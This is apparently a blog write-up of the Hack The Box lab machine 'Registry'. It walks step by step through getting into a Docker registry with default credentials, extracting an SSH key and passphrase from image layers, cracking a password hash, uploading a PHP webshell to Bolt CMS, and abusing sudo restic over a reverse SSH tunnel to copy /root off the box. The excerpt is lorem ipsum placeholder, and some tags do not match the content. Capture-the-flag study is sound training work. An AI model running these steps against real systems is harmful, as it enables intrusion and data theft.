---
layout: single
title: Registry - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-10-29
classes: wide
header:
  teaser: /assets/images/htb-writeup-registry/registry_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-registry/registry_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. nmap -Pn -sC -sV -n 10.10.10.159
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
    |   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
    |_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
    80/tcp  open  http     nginx 1.14.0 (Ubuntu)
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    |_http-title: Welcome to nginx!
    443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    |_http-title: Welcome to nginx!
    | ssl-cert: Subject: commonName=docker.registry.htb
    | Not valid before: 2019-05-06T21:14:35
    |_Not valid after:  2029-05-03T21:14:35
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

2. Add all names to /etc/hosts
    root@p3:~# cat /etc/hosts
    10.10.10.159	registry.htb registry.htb.local docker.registry.htb

3. Enumeration with dirb finds..
    .. a login prompt at http://docker.registry.htb/v2/
    .. a page with scrambled text at http://registry.htb/install/

  3.1 (OPTIONAL) The data on registry.htb/install/ is actually not garbage, but gzip compressed data.
      root@p3:/opt/htb# curl http://registry.htb/install/ -o test | tac | file -b test
      gzip compressed data, last modified: Mon Jul 29 23:38:20 2019, from Unix, original size modulo 2^32 167772200 gzip compressed data, reserved method, has CRC, was "", from FAT filesystem (MS-DOS, OS/2, NT), original size modulo 2^32 167772200
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
      100  1050    0  1050    0     0  15217      0 --:--:-- --:--:-- --:--:-- 15000

     Decompress it using gunzip:
      root@p3:/opt/htb/machines/registry# curl http://registry.htb/install/ -o - | gunzip
        % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                       Dload  Upload   Total   Spent    Left  Speed
      100  1050    0  1050    0     0  15441      0 --:--:-- --:--:-- --:--:-- 15441
      ca.crt0000775000004100000410000000210613464123607012215 0ustar  www-datawww-data
      -----BEGIN CERTIFICATE-----
      MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
      BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
      MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
      AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
      T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
      zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
      r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
      zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
      qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
      8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
      HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
      LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
      UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
      7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
      CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
      QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
      -----END CERTIFICATE-----
      readme.md0000775000004100000410000000020113472260460012667 0ustar  www-datawww-data
      # Private Docker Registry

      - https://docs.docker.com/registry/deploying/
      - https://docs.docker.com/engine/security/certificates/

      gzip: stdin: unexpected end of file

  3.2 (OPTIONAL) Write the certificate - ca.crt - to a file and import it to firefox.
     Remove the old unsecure https cert to get a secure, trused, connection towards https://docker.registry.htb

4. Enumeration with nikto finds..
    .. Default account found for 'Registry' at /v2/_catalog (ID 'admin', PW 'admin').
    .. /v2/_catalog: This is the Docker Registry server. This might be interesting...

5. Using CURL we can browse and download files from the Registry. Note that this can also be done through the browser.
    Search for available repos:
      root@p3:/opt/htb# curl -u admin:admin -k --request GET https://docker.registry.htb/v2/_catalog
      {"repositories":["bolt-image"]}

    Browse the repo 'bolt-image':
      root@p3:/opt/htb# curl -u admin:admin -k --request GET https://docker.registry.htb/v2/bolt-image/tags/list#
      {"name":"bolt-image","tags":["latest"]}

    Browse/download the tag 'latest', in example below I'll download it:
      curl -u admin:admin -k --request GET https://docker.registry.htb/v2/bolt-image/manifests/latest -O
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
      100  7439  100  7439    0     0  44544      0 --:--:-- --:--:-- --:--:-- 44544

6. View the output of the file latest and download all the blobs within.
    curl -u admin:admin -k -O --request GET ..
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:2931a8b44e495489fdbe2bccd7232e99b182034206067a364553841a1f06f791
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:f5029279ec1223b70f2cbb2682ab360e1837a2ea59a8d7ff64b38e9eab5fb8c0
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:d9af21273955749bb8250c7a883fcce21647b54f5a685d237bc6b920a2ebad1a
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:8882c27f669ef315fc231f272965cd5ee8507c0f376855d6f9c012aae0224797
    .. https://docker.registry.htb/v2/bolt-image/blobs/sha256:f476d66f540886e2bb4d9c8cc8c0f8915bca7d387e536957796ea6c2f8e7dfff

    Loot:
     .. expect "Enter passphrase for /root/.ssh/id_rsa:" send "GkOcz221Ftb3ugog\n";
     .. useradd -m bolt
     .. id_rsa and id_rsa.pub

7. Change permissions of id_rsa and login with SSH using found credentials and key (bolt:GkOcz221Ftb3ugog)
    root@p3:/opt/htb/machines/registry# chmod 600 id_rsa
    root@p3:/opt/htb/machines/registry# ssh bolt@registry.htb -i id_rsa
      Enter passphrase for key 'id_rsa':
      Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

        System information as of Tue Oct 29 09:43:36 UTC 2019

        System load:  0.0               Users logged in:                0
        Usage of /:   5.5% of 61.80GB   IP address for eth0:            10.10.10.159
        Memory usage: 22%               IP address for br-1bad9bd75d17: 172.18.0.1
        Swap usage:   0%                IP address for docker0:         172.17.0.1
        Processes:    154
      Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2
      bolt@bolt:~$
      bolt@bolt:~$ cat user.txt
        ytc0****************************


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Enumerate with lse.sh and find the Bolt git repo
    /var/www/html/bolt/.git

2. Look within the repo and find a .db for Bolt. Unable to download the file using http.server and wget so instead use scp locally.
    root@p3# scp -i id_rsa bolt@registry.htb:/var/www/html/bolt/app/database/bolt.db /opt/htb/machines/registry/
      Enter passphrase for key 'id_rsa':
      bolt.db                                                                        100%  288KB   1.6MB/s   00:00

3. Open the .db with SQLite and under table bolt_users you find user 'admin' with a password hash.

4. Crack the hash using hashcat -m3200 (Blowfish)
    root@p3:/opt/htb/machines/registry# hashcat -a0 -m3200 bolt-hash.txt /usr/share/wordlists/rockyou.txt -o hash-cracked.txt --force
    root@p3:/opt/htb/machines/registry# cat hash-cracked.txt
      $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK:strawberry

    NOTE: Bolt creds - admin:strawberry

5. Login as Bolt admin on the login page (found by manually looking through /var/www/html)
    http://registry.htb/bolt/bolt

6. Change the Main Configuration to allow .php Uploads
    Configuration > Main Configuration > Add 'php' in the end of 'accept_file_types'

7. Upload a php-webshell from the File Management, use it and QUICKLY move the shell back one dir. (files dir auto clears every 60s)
    mv webshell.php ..

8. Access the webshell again and continue enumeration as www-data
    http://registry.htb/bolt/webshell.php?cmd=id

9. Executing 'sudo -l' shows that we have root privs to do a restic backup to a remote REST server.
    User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*

10. Install the prerequisites in order to do the backup to your local machine
      root@p3:/srv# apt install restic
      root@p3:/srv# apt install golang  (required for rest server)
      root@p3:/srv# git clone https://github.com/restic/rest-server.git
      root@p3:/srv/rest-server# make install

11. Locally - create (init) a new Restic repo and start the rest-server. All outgoing traffic from registry.htb is blocked,
    we can't wget files, ssh, or push a backup to our local repo. To circumvent this we need to create a SSH-tunnel over
    port 8000 (rest-server default port).
      root@p3:/srv# restic init --repo /srv/restic-repo
        enter password for new repository:                            (mypass)
        enter password again:                                         (mypass)
        created restic repository 817c1fd867 at /srv/restic-repo

      root@p3:/srv# rest-server --path /srv/restic-repo/ --no-auth
      root@p3:/opt/htb/machines/registry# ssh -R 8000:127.0.0.1:8000 bolt@registry.htb -i id_rsa

12. On the remote host create a password-file for the restic-repo and backup the /root dir to your local restic repo
      echo "mypass" > pp

      sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000/ /root -p pp
        scan [/root]
        [0:00] 10 directories, 14 files, 28.066 KiB
        scanned 10 directories, 14 files in 0:00
        [0:00] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00

        duration: 0:00
        snapshot 404fffee saved

13. View your snapshots and backup the root dir from Registry. Grab root.txt
      root@p3:/srv# restic -r /srv/restic-repo/ snapshots
        enter password for repository:
        repository 817c1fd8 opened successfully, password is correct
        ID        Time                 Host        Tags        Paths
        ---------------------------------------------------------------------------------
        d6a158ec  2019-11-07 10:46:02  p3                      /opt/htb/machines/registry
        404fffee  2019-11-07 10:48:05  bolt                    /root
        ---------------------------------------------------------------------------------
        2 snapshots

      root@p3:/srv# restic -r /srv/restic-repo/ restore 404fffee --target /opt/htb/machines/registry/restic-restore
        enter password for repository:
        repository 817c1fd8 opened successfully, password is correct
        restoring <Snapshot 404fffee of [/root] at 2019-11-07 09:48:05.721258436 +0000 UTC by root@bolt> to /opt/htb/machines/registry/restic-restore

      root@p3:/srv# tree /opt/htb/machines/registry/restic-restore/
        /opt/htb/machines/registry/restic-restore/
        └── root
            ├── config.yml
            ├── cron.sh
            └── root.txt

        1 directory, 3 files

      root@p3:/srv# cat /opt/htb/machines/registry/restic-restore/root/root.txt
        ntrk****************************



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

Docker
  https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/

Hashcat
  https://hashcat.net/wiki/doku.php?id=example_hashes

Restic
  https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html#rest-server
  https://restic.net/#quickstart
  https://restic.readthedocs.io/en/latest/050_restore.html#restoring-from-a-snapshot

Rest Server
  https://github.com/restic/rest-server
